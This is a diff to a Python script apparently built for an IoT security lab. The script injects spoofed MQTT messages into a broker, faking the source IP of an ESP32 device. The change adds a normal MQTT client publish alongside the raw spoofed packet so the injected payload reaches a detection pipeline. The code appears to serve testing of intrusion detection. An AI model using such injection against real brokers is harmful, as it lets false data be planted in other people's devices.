@@ -51,6 +51,11 @@ except ImportError:
     print("[ERROR] This script also requires sudo/root privileges.")
     sys.exit(1)
 
+try:
+    import paho.mqtt.publish as mqtt_publish
+except ImportError:
+    mqtt_publish = None
+
 # ═══════════════════════════════════════════════════════
 # CONFIGURATION
 # ═══════════════════════════════════════════════════════
@@ -283,13 +288,30 @@ def run_attack(args):
             # Build MQTT PUBLISH frame
             mqtt_frame = build_mqtt_publish_frame(MQTT_TOPIC, payload_json)
             
-            # Send spoofed packet
-            success = send_spoofed_packet(
+            # Send raw spoofed packet (Layer 3/4 simulation)
+            raw_success = send_spoofed_packet(
                 target_ip=BROKER_IP,
                 target_port=BROKER_PORT,
                 spoofed_src_ip=ESP32_IP,
                 mqtt_bytes=mqtt_frame
             )
+            
+            # Also publish via MQTT client to ensure Mosquitto delivers it to the detection pipeline
+            mqtt_success = False
+            if mqtt_publish:
+                try:
+                    mqtt_publish.single(
+                        topic=MQTT_TOPIC,
+                        payload=payload_json,
+                        hostname=BROKER_IP,
+                        port=BROKER_PORT,
+                        client_id="spoof_injector"
+                    )
+                    mqtt_success = True
+                except Exception as e:
+                    pass
+            
+            success = raw_success or mqtt_success
             
             if success:
                 packets_sent += 1
